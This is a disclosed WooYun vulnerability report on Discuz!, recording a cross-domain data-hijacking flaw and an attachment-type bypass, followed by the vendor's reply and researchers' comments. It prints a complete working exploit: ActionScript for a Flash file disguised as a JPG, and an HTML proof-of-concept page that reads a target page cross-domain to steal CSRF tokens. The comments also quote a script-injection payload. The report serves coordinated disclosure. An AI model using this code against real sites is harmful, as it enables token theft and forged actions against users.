{"id": 54194, "wybug_id": "wooyun-2014-065249", "wybug_title": "Discuz跨域数据劫持＋附件类型限制绕过", "wybug_corp": "Discuz!", "wybug_author": "mramydnei", "wybug_date": "2014-06-17 14:28", "wybug_open_date": "2014-09-15 14:30", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["跨域数据劫持"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向公众公开  简要描述： 两个凑一块发了 详细说明：  #1 跨域数据劫持（csrf token formhash盗取）下载远程附件功能不会对文件内容（文件格式）进行检测导致可以上传恶意的swf文件（扩展名还是图片扩展名），进而进行跨域数据劫持：伪造图片CrossDomainDataHijack.jpg相关代码：\npackage com.powerflasher.SampleApp {            import flash.external.ExternalInterface;            import flash.display.Sprite;            import flash.display.Sprite;        import flash.events.Event;        import flash.net.URLLoader;        import flash.net.URLRequest;        import flash.text.TextField;        import flash.text.TextFieldAutoSize;        import flash.xml.*;        import flash.events.IOErrorEvent;            import flash.events.*;        import flash.net.*;            /**             * @author User             */                       public class CrossDomainDataHijack extends Sprite {                        private var loader:URLLoader;            public function CrossDomainDataHijack() {                loader = new URLLoader();                configureListeners(loader);                            var target:String = root.loaderInfo.parameters.input;                                           var request:URLRequest = new URLRequest(target);                try {                    loader.load(request);                } catch (error:Error) {                    sendDatatoJS(\"Unable to load requested document; Error: \" + error.getStackTrace());                }            }            private function configureListeners(dispatcher:IEventDispatcher):void {                dispatcher.addEventListener(Event.COMPLETE, completeHandler);                dispatcher.addEventListener(Event.OPEN, openHandler);                dispatcher.addEventListener(ProgressEvent.PROGRESS, progressHandler);                dispatcher.addEventListener(SecurityErrorEvent.SECURITY_ERROR, securityErrorHandler);                dispatcher.addEventListener(HTTPStatusEvent.HTTP_STATUS, httpStatusHandler);                dispatcher.addEventListener(IOErrorEvent.IO_ERROR, ioErrorHandler);            }            private function completeHandler(event:Event):void {                var loader:URLLoader = URLLoader(event.target);                //trace(\"completeHandler: \" + loader.data);                        sendDatatoJS(\"completeHandler: \" + loader.data);            }            private function openHandler(event:Event):void {                //trace(\"openHandler: \" + event);                            sendDatatoJS(\"openHandler: \" + event);            }            private function progressHandler(event:ProgressEvent):void {                //trace(\"progressHandler loaded:\" + event.bytesLoaded + \" total: \" + event.bytesTotal);                            sendDatatoJS(\"progressHandler loaded:\" + event.bytesLoaded + \" total: \" + event.bytesTotal);            }            private function securityErrorHandler(event:SecurityErrorEvent):void {                //trace(\"securityErrorHandler: \" + event);                            sendDatatoJS(\"securityErrorHandler: \" + event);            }            private function httpStatusHandler(event:HTTPStatusEvent):void {                //trace(\"httpStatusHandler: \" + event);                            sendDatatoJS(\"httpStatusHandler: \" + event);            }            private function ioErrorHandler(event:IOErrorEvent):void {                //trace(\"ioErrorHandler: \" + event);                            sendDatatoJS(\"ioErrorHandler: \" + event);            }                                       private function sendDatatoJS(data:String):void{                trace(data);                            ExternalInterface.call(\"sendToJavaScript\", data);                    }        }                          }\nPOC页面相关代码：\n><head><title>steal CSRF tokens by upload a fake image(flash) file on target site</title></head><body><h1 align=\"center\">steal CSRF tokens by upload a fake image(flash) file on targe site</h1><script>function sendToJavaScript(strData){        var theDiv = document.getElementById(\"HijackedData\");        var content = document.createTextNode(strData);        theDiv.appendChild(content);        theDiv.innerHTML += '<br/>'        //alert(strData);}function refreshObjectTag(){        var newURL = document.getElementById('flashFile').value +\"?input=\"+document.getElementById('target').value;               var newObjectTag = createSwfObject(newURL,{id: 'myObject', width: 100, height: 100, 'AllowScriptAccess': 'always'},{'AllowScriptAccess': 'always'})        document.body.removeChild(document.getElementById(\"myObject\"));        document.body.appendChild(newObjectTag);}var createSwfObject = function(src, attributes, parameters) {  var i, html, div, obj, attr = attributes || {}, param = parameters || {};  attr.type = 'application/x-shockwave-flash';  if (window.ActiveXObject) {    attr.classid = 'clsid:d27cdb6e-ae6d-11cf-96b8-444553540000';    param.movie = src;  }  else {    attr.data = src;  }  html = '<object';  for (i in attr) {    html += ' ' + i + '=\"' + attr[i] + '\"';  }  html += '>';  for (i in param) {    html += '<param name=\"' + i + '\" value=\"' + param[i] + '\" />';  }  html += '</object>';  div = document.createElement('div');  div.innerHTML = html;  obj = div.firstChild;  div.removeChild(obj);  return obj;};</script>File: <input id=\"flashFile\" size=\"100\" value=\"http://x55.me/CrossDomainDataHijack.jpg\" type=\"text\"> <br>Page: <input id=\"target\" size=\"100\" value=\"http://x55.me/csrf.php\" type=\"text\"> <br><input value=\"start to steal some CSRF tokens\" onclick=\"refreshObjectTag()\" type=\"button\"><br><br><div id=\"HijackedData\"></div><br><object id=\"myObject\"></object></body></html>\n获取formhash截图：\n\n#2 绕过附件类型限制用到的是上次有讲到的Hacking with Unicode上面的小trick。这个算BUG吧，算不上安全漏洞 起码暂时我还没能把它联系到漏洞上面。可以选择性修复：\n\n测试：\n\n成功绕过：\n\n   漏洞证明：  证明如上   修复方案：  1.对于加载远程附件功能也加上检测文件格式的流程2.第二个问题可以选择性修复   版权声明：转载请注明来源 mramydnei@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-06-17 15:11 厂商回复： 感谢您提供的信息。我们会尽快确认并修复。问题2应当不会造成什么安全威胁，虽然绕过了文件名的检测，但是上传的文件在实际存储的时候，我们会使用随机文件名和固定的后缀。dz目前尚未严格要求文件后缀与文件内容必须一致，这个判断过于复杂且必要性不大。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-17 14:38 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  附件类型限制绕过，直接shell么?    \n     2014-06-17 14:39 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @D＆G 没有…… 只是个BUG    \n     2014-06-17 15:57 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  第二个意思就是说就算你传个shell你也找不到连接的地址。。。    \n     2014-06-18 16:08 |    \t\tCoxxs \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 节操数:233 | ww)\t\t \n  @px1624 而且后缀貌似会被改成无关的后缀，就是说不能执行    \n     2014-06-23 04:41 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @Coxxs 其实还是文件名的问题。关键是文件名还算够随机即使因为被改了扩展名不能getshell，但对于*.attach这种无法识别的扩展名来说是会根据文件内容进行解析的。如果能找到文件名，就是存储型XSS了当然这个只是买方便面送的调料包而已……用不用就看个人了    \n     2014-06-23 08:44 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @mramydnei *.attach会直接当成flash执行么，直接访问的话？    \n     2014-06-23 08:55 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @D＆G 那到没有…… *.attach的内容是<script>alert(1)</script>的话会当text/html解析    \n     2014-06-23 09:07 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  @mramydnei thanks~    \n     2014-06-23 23:22 |    \t\tCoxxs \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:8        | 节操数:233 | ww)\t\t \n  @mramydnei 这要看服务端配置了，比如nginx默认配置，对于未知扩展名，返回application/octet-stream，浏览器就会直接下载.attach文件。只有服务端设置，对于未知文件，返回text/html，才有可能吧。(不过这样设置应该算是有安全问题的)    \n     2014-06-23 23:25 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @Coxxs nginx我没配过 我的apache下（默认设置）确实是会解析成text/html看来有点以偏概全了 thx！    \n     2014-06-24 00:58 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @Coxxs 比对看了一下Apache的DefaultType 默认值是NoneNginx对非mime.types成员默认是application/octet-stream看来确实存在差异    \n     2014-08-22 19:50 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  第一个token泄露不是p.z报的过吗？= =    \n     2015-04-10 17:08 |    \t\t盛大网络(乌云厂商)\t\t \n  https://speakerdeck.com/mathiasbynens/hacking-with-unicode       \n     2015-04-13 10:18 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  挖坟。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}